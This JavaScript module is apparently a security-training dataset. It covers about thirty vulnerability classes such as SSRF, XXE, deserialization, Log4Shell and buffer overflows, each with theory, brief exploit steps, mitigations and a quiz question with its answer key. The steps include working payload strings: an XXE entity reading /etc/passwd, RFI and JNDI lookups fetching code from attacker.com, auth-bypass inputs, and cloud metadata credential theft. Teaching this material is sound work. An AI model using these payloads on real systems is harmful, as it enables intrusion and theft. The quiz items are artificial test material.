module.exports = [
  {
    "name": "Server-Side Request Forgery (SSRF)",
    "definition": "SSRF allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing.",
    "theory": "The server fetches a remote resource based on user-supplied input (a URL) without validating it. Attackers abuse this to reach internal services (169.254.169.254 cloud metadata, localhost admin panels, internal APIs) not exposed externally. Bypasses: decimal IP, IPv6, DNS rebinding, redirect chains.",
    "cve": "CVE-2021-26855 (Microsoft Exchange ProxyLogon)",
    "exploit": "1. Find a param that fetches a URL (?url=...).\n2. Replace with http://169.254.169.254/latest/meta-data/ (AWS).\n3. Enumerate IAM creds: /latest/meta-data/iam/security-credentials/.\n4. Use stolen keys against the cloud account.",
    "mitigation": "Whitelist domains, block private IP ranges, disable unused URL schemes, enforce IMDSv2.",
    "quiz": {
      "question": "Which internal IP is most commonly targeted in AWS SSRF attacks?",
      "options": [
        "127.0.0.1",
        "169.254.169.254",
        "10.0.0.1",
        "192.168.1.1"
      ],
      "answer": 1
    }
  },
  {
    "name": "XML External Entity (XXE) Injection",
    "definition": "XXE allows an attacker to interfere with an application's processing of XML data, often disclosing files or causing SSRF.",
    "theory": "XML parsers allowing DOCTYPE/external entities can be tricked into reading local files or making network requests. Caused by insecurely configured parsers (DTD enabled).",
    "cve": "CVE-2018-1000840",
    "exploit": "1. Submit XML with malicious DTD:\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<root><data>&xxe;</data></root>\n2. Server reflects /etc/passwd.\n3. Use php://filter or OOB for blind XXE.",
    "mitigation": "Disable DTDs and external entities; prefer JSON.",
    "quiz": {
      "question": "What must be enabled in an XML parser for XXE to work?",
      "options": [
        "JSON parsing",
        "DTD / external entity processing",
        "HTTPS",
        "Cookies"
      ],
      "answer": 1
    }
  },
  {
    "name": "Insecure Deserialization",
    "definition": "Untrusted data is used to abuse app logic by deserializing malicious objects, often leading to RCE.",
    "theory": "Apps deserializing attacker-controlled objects (Java, PHP, Python pickle, .NET) can be forced to run gadget chains during reconstruction, causing RCE.",
    "cve": "CVE-2017-9805 (Apache Struts REST)",
    "exploit": "1. Identify serialized data (Java rO0AB..., PHP O:4:...).\n2. Use ysoserial to craft a gadget chain.\n3. Send payload; chain triggers command execution.",
    "mitigation": "Never deserialize untrusted data; HMAC integrity; allowlist classes.",
    "quiz": {
      "question": "Which tool generates Java deserialization gadget chains?",
      "options": [
        "sqlmap",
        "ysoserial",
        "Burp",
        "nmap"
      ],
      "answer": 1
    }
  },
  {
    "name": "Server-Side Template Injection (SSTI)",
    "definition": "User input embedded into a template engine unsafely, allowing template execution and often RCE.",
    "theory": "Template engines (Jinja2, Twig, Freemarker) evaluate expressions. If input reaches the template directly, attackers run server-side code.",
    "cve": "CVE-2019-8341 (Jinja2)",
    "exploit": "1. Inject {{7*7}} -> returns 49 confirms SSTI.\n2. Jinja2: {{ ''.__class__.__mro__[1].__subclasses__() }}.\n3. Find os/subprocess gadget to run commands.",
    "mitigation": "Never concatenate input into templates; sandbox; logic-less templates.",
    "quiz": {
      "question": "Which payload is a classic SSTI detection probe?",
      "options": [
        "{{7*7}}",
        "' OR 1=1--",
        "<script>alert(1)</script>",
        "../../etc/passwd"
      ],
      "answer": 0
    }
  },
  {
    "name": "Cross-Site Request Forgery (CSRF)",
    "definition": "Tricks an authenticated user's browser into submitting a malicious request to a site where they're logged in.",
    "theory": "Browsers auto-send cookies, so a malicious page can forge state-changing requests if no anti-CSRF token is required.",
    "cve": "CVE-2018-9942",
    "exploit": "1. Craft auto-submitting HTML form to victim endpoint.\n2. Lure victim while logged in.\n3. Browser sends authenticated request -> action executes.",
    "mitigation": "Anti-CSRF tokens, SameSite=Strict cookies, verify Origin/Referer.",
    "quiz": {
      "question": "Which cookie attribute best mitigates CSRF?",
      "options": [
        "HttpOnly",
        "Secure",
        "SameSite=Strict",
        "Domain"
      ],
      "answer": 2
    }
  },
  {
    "name": "Path / Directory Traversal",
    "definition": "Read arbitrary files outside the intended directory using ../ sequences.",
    "theory": "Apps building file paths from input without sanitization let attackers escape the web root to sensitive files.",
    "cve": "CVE-2021-41773 (Apache HTTP Server)",
    "exploit": "1. Find ?file=report.pdf.\n2. Try ?file=../../../../etc/passwd.\n3. Encoding bypass: %2e%2e%2f or ....//",
    "mitigation": "Canonicalize paths, allowlists, avoid passing input to FS APIs.",
    "quiz": {
      "question": "What sequence is the hallmark of path traversal?",
      "options": [
        "&&",
        "../",
        "<>",
        "%00 only"
      ],
      "answer": 1
    }
  },
  {
    "name": "Local File Inclusion (LFI)",
    "definition": "Include local files on the server through dynamic inclusion mechanisms.",
    "theory": "Scripts that include files based on input (PHP include) can read logs/configs or escalate to RCE via log poisoning / PHP wrappers.",
    "cve": "CVE-2018-16763 (FUEL CMS)",
    "exploit": "1. ?page=about -> ?page=../../../../etc/passwd.\n2. php://filter/convert.base64-encode/resource=index.php.\n3. Log poisoning + LFI -> RCE.",
    "mitigation": "Allowlist includable files; disable allow_url_include.",
    "quiz": {
      "question": "LFI can escalate to RCE through which technique?",
      "options": [
        "Log poisoning",
        "DNS spoofing",
        "ARP poisoning",
        "Phishing"
      ],
      "answer": 0
    }
  },
  {
    "name": "Remote File Inclusion (RFI)",
    "definition": "Include a remote attacker-hosted file into execution, often leading to RCE.",
    "theory": "With allow_url_include enabled and unsanitized input, the server fetches and executes a remote malicious script.",
    "cve": "CVE-2017-9841 (PHPUnit eval-stdin)",
    "exploit": "1. ?page=http://attacker.com/shell.txt.\n2. Server fetches & executes remote PHP shell.\n3. Gain command execution.",
    "mitigation": "Disable allow_url_include and allow_url_fopen.",
    "quiz": {
      "question": "RFI includes files from where (vs LFI)?",
      "options": [
        "The local disk",
        "A remote attacker-controlled server",
        "The database",
        "Memory"
      ],
      "answer": 1
    }
  },
  {
    "name": "Open Redirect",
    "definition": "Craft a link that redirects victims to a malicious site via a trusted domain.",
    "theory": "Unvalidated redirect params enable phishing, OAuth token theft, SSRF chaining. The trusted domain builds victim confidence.",
    "cve": "CVE-2019-11510 context",
    "exploit": "1. Find ?redirect=/dashboard.\n2. Change to ?redirect=https://evil.com.\n3. Use in phishing to steal creds/OAuth codes.",
    "mitigation": "Relative paths only, allowlist targets, interstitial warnings.",
    "quiz": {
      "question": "Open redirects are most commonly abused for?",
      "options": [
        "Phishing / token theft",
        "Buffer overflow",
        "Race condition",
        "DoS"
      ],
      "answer": 0
    }
  },
  {
    "name": "Race Condition (TOCTOU)",
    "definition": "Timing of operations is manipulated to cause unintended behavior, e.g. double-spending.",
    "theory": "Time-of-check to time-of-use gaps let concurrent requests bypass limits (redeem coupon twice, withdraw twice).",
    "cve": "CVE-2016-5195 (Dirty COW)",
    "exploit": "1. Identify a limited action.\n2. Send many simultaneous requests (Turbo Intruder / single-packet).\n3. Multiple succeed before the check updates.",
    "mitigation": "Atomic operations, DB locks, idempotency keys, transactions.",
    "quiz": {
      "question": "Race conditions exploit the gap between which two events?",
      "options": [
        "Login and logout",
        "Check and use (TOCTOU)",
        "Request and response",
        "DNS and TCP"
      ],
      "answer": 1
    }
  },
  {
    "name": "Business Logic Vulnerability",
    "definition": "Flaws in business rule design/implementation allowing unintended behavior.",
    "theory": "Logic flaws: negative quantities, price manipulation, skipping payment, abusing workflows. Scanners can't find them.",
    "cve": "CVE-2020-11651 context",
    "exploit": "1. Add item, intercept, set quantity=-1.\n2. Total becomes negative -> account credited.\n3. Or skip payment and jump to 'order confirmed'.",
    "mitigation": "Validate business rules server-side; enforce state machines.",
    "quiz": {
      "question": "Why are business logic flaws hard for scanners?",
      "options": [
        "They require understanding intended behavior",
        "They use encryption",
        "They are network-only",
        "They need root"
      ],
      "answer": 0
    }
  },
  {
    "name": "Subdomain Takeover",
    "definition": "A subdomain points to a deprovisioned external service an attacker can re-register.",
    "theory": "A dangling DNS CNAME points to an unclaimed service (S3, GitHub Pages, Heroku). Attacker claims it and serves content on the victim's subdomain.",
    "cve": "Multiple disclosed (HackerOne)",
    "exploit": "1. Enumerate subdomains (subfinder, amass).\n2. Find CNAMEs to unclaimed services (404 fingerprint).\n3. Register that service and host content.",
    "mitigation": "Remove dangling DNS records; audit DNS regularly.",
    "quiz": {
      "question": "Subdomain takeover exploits a dangling what?",
      "options": [
        "TCP port",
        "DNS CNAME record",
        "Cookie",
        "JWT"
      ],
      "answer": 1
    }
  },
  {
    "name": "JWT Vulnerabilities",
    "definition": "Flaws in JWT implementation: 'none' algorithm, weak secrets, key confusion.",
    "theory": "JWTs are signed tokens. Misconfigs: accepting alg:none, brute-forcing HS256 secrets, RS256->HS256 key confusion.",
    "cve": "CVE-2015-9235 (jsonwebtoken)",
    "exploit": "1. Decode the JWT (base64).\n2. Set alg to 'none' and strip signature.\n3. Or crack HS256 secret with hashcat and re-sign as admin.",
    "mitigation": "Pin the algorithm, strong secrets/keys, strict validation.",
    "quiz": {
      "question": "Which JWT algorithm setting is dangerous if accepted?",
      "options": [
        "RS256",
        "none",
        "ES256",
        "HS512"
      ],
      "answer": 1
    }
  },
  {
    "name": "Clickjacking (UI Redressing)",
    "definition": "Trick a user into clicking something different from what they perceive via invisible iframes.",
    "theory": "Attacker overlays a transparent iframe of a target over decoy content, so victim clicks trigger framed-site actions.",
    "cve": "Various framing issues",
    "exploit": "1. Iframe the target with opacity:0 over a fake button.\n2. Position the real button under the cursor.\n3. Victim clicks -> hidden action executes.",
    "mitigation": "X-Frame-Options: DENY and CSP frame-ancestors 'none'.",
    "quiz": {
      "question": "Which header prevents clickjacking?",
      "options": [
        "X-Frame-Options",
        "Content-Type",
        "Cache-Control",
        "ETag"
      ],
      "answer": 0
    }
  },
  {
    "name": "CORS Misconfiguration",
    "definition": "Improper CORS config lets malicious sites read sensitive responses.",
    "theory": "Reflecting Origin into Access-Control-Allow-Origin with credentials lets any attacker site read authenticated responses.",
    "cve": "Many web app cases",
    "exploit": "1. Send request with Origin: https://evil.com.\n2. If reflected + Allow-Credentials:true, read victim data via JS.\n3. Exfiltrate to attacker server.",
    "mitigation": "Strict origin allowlist; never reflect arbitrary origins with creds.",
    "quiz": {
      "question": "Dangerous CORS combo reflects Origin together with what?",
      "options": [
        "Allow-Credentials: true",
        "HttpOnly",
        "Cache-Control",
        "Gzip"
      ],
      "answer": 0
    }
  },
  {
    "name": "HTTP Request Smuggling",
    "definition": "Exploits front-end/back-end disagreement in parsing request boundaries.",
    "theory": "When proxy and back-end disagree on Content-Length vs Transfer-Encoding, attacker smuggles a hidden request, poisoning others' responses.",
    "cve": "CVE-2019-18277 (HAProxy)",
    "exploit": "1. Send crafted request with both CL and TE (CL.TE / TE.CL).\n2. Back-end mis-parses, leaving a prefix.\n3. Next user's request gets prepended -> hijack.",
    "mitigation": "Normalize requests, reject ambiguous CL/TE, HTTP/2 end-to-end.",
    "quiz": {
      "question": "Request smuggling abuses disagreement between which headers?",
      "options": [
        "Host & Referer",
        "Content-Length & Transfer-Encoding",
        "Cookie & Origin",
        "Accept & ETag"
      ],
      "answer": 1
    }
  },
  {
    "name": "Mass Assignment",
    "definition": "Framework auto-binds request params to object fields, setting unintended fields.",
    "theory": "ORMs auto-mapping JSON to model attributes let attackers add isAdmin:true or balance:9999 to requests.",
    "cve": "CVE-2012-2660 (Ruby on Rails)",
    "exploit": "1. Register/update with extra JSON: {\"username\":\"x\",\"role\":\"admin\"}.\n2. Framework binds role -> privilege escalation.",
    "mitigation": "Allowlists (strong params), DTOs, explicit binding.",
    "quiz": {
      "question": "Mass assignment lets attackers set which fields?",
      "options": [
        "Only public fields",
        "Unintended sensitive fields like isAdmin",
        "CSS styles",
        "DNS records"
      ],
      "answer": 1
    }
  },
  {
    "name": "Prototype Pollution (JavaScript)",
    "definition": "Attacker modifies Object.prototype, affecting all objects; can lead to RCE/DoS.",
    "theory": "Insecure recursive merge/clone lets keys like __proto__ inject properties into the base prototype, polluting every object.",
    "cve": "CVE-2019-10744 (lodash)",
    "exploit": "1. Send JSON: {\"__proto__\":{\"isAdmin\":true}}.\n2. Vulnerable merge pollutes Object.prototype.\n3. App treats all users as admin or crashes.",
    "mitigation": "Freeze prototypes, use Map, sanitize __proto__/constructor.",
    "quiz": {
      "question": "Which key is central to prototype pollution?",
      "options": [
        "__proto__",
        "self",
        "this",
        "window"
      ],
      "answer": 0
    }
  },
  {
    "name": "Server-Side Includes (SSI) Injection",
    "definition": "Inject SSI directives into server-parsed pages, leading to command execution.",
    "theory": "Servers parsing SSI (.shtml) execute directives like <!--#exec--> found in user input.",
    "cve": "CVE-2021-40438 context (Apache)",
    "exploit": "1. Inject <!--#exec cmd=\"id\"--> into a reflected field on an SSI page.\n2. Server executes the command and reflects output.",
    "mitigation": "Disable SSI exec, sanitize input, avoid .shtml for user content.",
    "quiz": {
      "question": "SSI injection executes directives like:",
      "options": [
        "<!--#exec cmd=...-->",
        "<script>",
        "SELECT *",
        "${jndi}"
      ],
      "answer": 0
    }
  },
  {
    "name": "LDAP Injection",
    "definition": "Manipulate LDAP queries via unsanitized input to bypass auth or extract data.",
    "theory": "Apps building LDAP filters from input can be tricked with special chars (*, ), |, &) to alter logic.",
    "cve": "CVE-2018-1000134 context",
    "exploit": "1. In a login filter (uid={input}), enter *)(uid=*))(|(uid=*.\n2. Filter always matches -> auth bypass.",
    "mitigation": "Escape LDAP special chars, parameterized LDAP APIs.",
    "quiz": {
      "question": "Which character is heavily abused in LDAP injection?",
      "options": [
        "*",
        "@",
        "#",
        "~"
      ],
      "answer": 0
    }
  },
  {
    "name": "NoSQL Injection",
    "definition": "Injection targeting NoSQL databases (MongoDB) via operator manipulation.",
    "theory": "NoSQL queries accept objects; passing operators like {$ne:null} can bypass auth or extract data.",
    "cve": "CVE-2021-22911 (Rocket.Chat)",
    "exploit": "1. Login JSON: {\"user\":\"admin\",\"pass\":{\"$ne\":null}}.\n2. Matches any non-null password -> login as admin.",
    "mitigation": "Cast inputs to expected types; reject objects where strings expected.",
    "quiz": {
      "question": "Which MongoDB operator is abused to bypass login?",
      "options": [
        "$ne",
        "$pull",
        "$inc",
        "$set"
      ],
      "answer": 0
    }
  },
  {
    "name": "Unrestricted File Upload",
    "definition": "Upload of dangerous file types (.php) that can be executed, leading to RCE.",
    "theory": "When validation relies on extension or client checks, attackers upload web shells. Bypasses: double extensions, null bytes, content-type spoofing.",
    "cve": "CVE-2020-9484 (Apache Tomcat)",
    "exploit": "1. Upload shell.php.jpg or shell.php%00.jpg.\n2. Access the uploaded path.\n3. Execute commands via the web shell.",
    "mitigation": "Server-side type validation, store outside webroot, rename, disable execution.",
    "quiz": {
      "question": "A safe practice for uploads is to store files where?",
      "options": [
        "Inside the web root",
        "Outside the web root / non-executable dir",
        "In /etc",
        "In cookies"
      ],
      "answer": 1
    }
  },
  {
    "name": "Host Header Injection",
    "definition": "Manipulate the Host header to poison links, reset passwords, or cache.",
    "theory": "Apps trusting Host to build URLs (password resets) can generate links to attacker domains, leaking tokens.",
    "cve": "CVE-2018-14773 context (Symfony)",
    "exploit": "1. Request password reset with Host: evil.com.\n2. Reset link points to evil.com with victim's token.\n3. Victim clicks -> token leaked.",
    "mitigation": "Allowlist valid hosts; don't build absolute URLs from Host.",
    "quiz": {
      "question": "Host header injection is often chained with which feature?",
      "options": [
        "Password reset links",
        "CSS rendering",
        "Image resizing",
        "Logging"
      ],
      "answer": 0
    }
  },
  {
    "name": "Cache Poisoning",
    "definition": "Inject malicious content into a cache so it's served to other users.",
    "theory": "Unkeyed inputs (headers) that influence responses but aren't part of the cache key let an attacker poison cached responses.",
    "cve": "Various CDN cases",
    "exploit": "1. Find unkeyed header (X-Forwarded-Host) reflected in response.\n2. Send poisoned request; CDN caches it.\n3. Other users receive malicious cached page.",
    "mitigation": "Include all influencing inputs in cache key; sanitize reflected headers.",
    "quiz": {
      "question": "Cache poisoning exploits which type of input?",
      "options": [
        "Unkeyed inputs",
        "Encrypted inputs",
        "Compressed inputs",
        "Signed inputs"
      ],
      "answer": 0
    }
  },
  {
    "name": "OAuth Misconfiguration",
    "definition": "Flaws in OAuth flows such as weak redirect_uri validation enabling token theft.",
    "theory": "Loose redirect_uri matching, missing state (CSRF), or leaking codes allow account takeover via the OAuth flow.",
    "cve": "CVE-2020-26877 context",
    "exploit": "1. Manipulate redirect_uri to attacker domain (if not strict).\n2. Victim's code/token delivered to attacker.\n3. Exchange for access -> account takeover.",
    "mitigation": "Exact-match redirect_uri, enforce state, short-lived codes, PKCE.",
    "quiz": {
      "question": "Which parameter prevents CSRF in OAuth flows?",
      "options": [
        "scope",
        "state",
        "client_id",
        "grant_type"
      ],
      "answer": 1
    }
  },
  {
    "name": "GraphQL Vulnerabilities",
    "definition": "Introspection abuse, batching attacks, excessive data exposure in GraphQL APIs.",
    "theory": "GraphQL flexibility leaks schema via introspection, allows DoS via nested queries, brute-force via batching/aliasing.",
    "cve": "CVE-2021-41248 context",
    "exploit": "1. Run introspection query to map the schema.\n2. Use aliases to batch many login attempts in one request.\n3. Nested queries for resource exhaustion (DoS).",
    "mitigation": "Disable introspection in prod, depth/complexity limits, rate-limit.",
    "quiz": {
      "question": "Which GraphQL feature leaks the entire API schema?",
      "options": [
        "Mutations",
        "Introspection",
        "Subscriptions",
        "Fragments"
      ],
      "answer": 1
    }
  },
  {
    "name": "Web Cache Deception",
    "definition": "Trick a cache into storing sensitive personalized pages later read by attackers.",
    "theory": "Appending a fake static extension (/account/page.css) makes the cache store a victim's authenticated page as static.",
    "cve": "PayPal research (2017)",
    "exploit": "1. Lure victim to /profile/foo.css.\n2. Cache stores their personal response as static.\n3. Attacker requests same URL and reads data.",
    "mitigation": "Cache only verified static content; validate Content-Type.",
    "quiz": {
      "question": "Web cache deception abuses fake what?",
      "options": [
        "Static file extensions",
        "TCP ports",
        "DNS records",
        "JWT claims"
      ],
      "answer": 0
    }
  },
  {
    "name": "Broken Object Level Authorization (BOLA)",
    "definition": "API endpoints expose objects by ID without checking ownership.",
    "theory": "OWASP API #1. Endpoints like /api/orders/{id} that don't verify ownership allow horizontal data access.",
    "cve": "CVE-2021-22214 context (GitLab API)",
    "exploit": "1. Request /api/v1/users/1001/invoice.\n2. Increment to 1002, 1003...\n3. Access other users' invoices.",
    "mitigation": "Per-object authorization checks on every request; unguessable IDs.",
    "quiz": {
      "question": "BOLA is ranked #1 in which list?",
      "options": [
        "OWASP API Top 10",
        "CWE Top 5",
        "NIST 800-53",
        "PCI DSS"
      ],
      "answer": 0
    }
  },
  {
    "name": "Dependency Confusion",
    "definition": "Supply-chain attack where a public malicious package shadows a private internal package name.",
    "theory": "If a build pulls from public registries and a private name isn't claimed, an attacker publishes a higher-version public package that gets installed.",
    "cve": "Disclosed by Alex Birsan (2021)",
    "exploit": "1. Discover internal package names (leaked package.json).\n2. Publish same-named package on npm/PyPI with higher version.\n3. Victim's build installs yours -> code execution in CI.",
    "mitigation": "Scoped packages, registry priorities, lock versions, claim namespaces.",
    "quiz": {
      "question": "Dependency confusion is a type of what attack?",
      "options": [
        "Supply chain attack",
        "DoS",
        "MITM",
        "Phishing"
      ],
      "answer": 0
    }
  },
  {
    "name": "Log4Shell / EL Injection",
    "definition": "Injection into logging/EL frameworks (Log4j JNDI) enabling remote code execution.",
    "theory": "Log4j evaluated ${jndi:ldap://...} lookups in logged strings, fetching/executing remote classes. EL injection abuses Expression Language similarly.",
    "cve": "CVE-2021-44228 (Log4Shell)",
    "exploit": "1. Send a header/field with ${jndi:ldap://attacker.com/a}.\n2. Vulnerable Log4j logs it and connects to attacker LDAP.\n3. Malicious class loaded -> RCE.",
    "mitigation": "Patch Log4j (>=2.17), disable JNDI lookups, WAF, remove JndiLookup.",
    "quiz": {
      "question": "Which payload indicates a Log4Shell attempt?",
      "options": [
        "${jndi:ldap://...}",
        "' OR 1=1",
        "<img onerror>",
        "../../"
      ],
      "answer": 0
    }
  },
  {
    "name": "Memory Corruption: Buffer Overflow",
    "definition": "Writing beyond a buffer's bounds, overwriting adjacent memory and potentially hijacking execution.",
    "theory": "In unsafe languages (C/C++), unchecked input copied into a fixed buffer overwrites the return address. Attackers redirect execution to shellcode or ROP chains.",
    "cve": "CVE-2019-0708 (BlueKeep)",
    "exploit": "1. Identify vulnerable input (strcpy, no bounds).\n2. Send oversized input to overwrite EIP/RIP.\n3. Control flow -> jump to shellcode (ROP to bypass DEP/ASLR).",
    "mitigation": "Safe functions, bounds checking, stack canaries, ASLR, DEP, memory-safe languages.",
    "quiz": {
      "question": "Buffer overflows typically aim to overwrite which value?",
      "options": [
        "The return address (EIP/RIP)",
        "The cookie",
        "The DNS cache",
        "The CSS"
      ],
      "answer": 0
    }
  }
];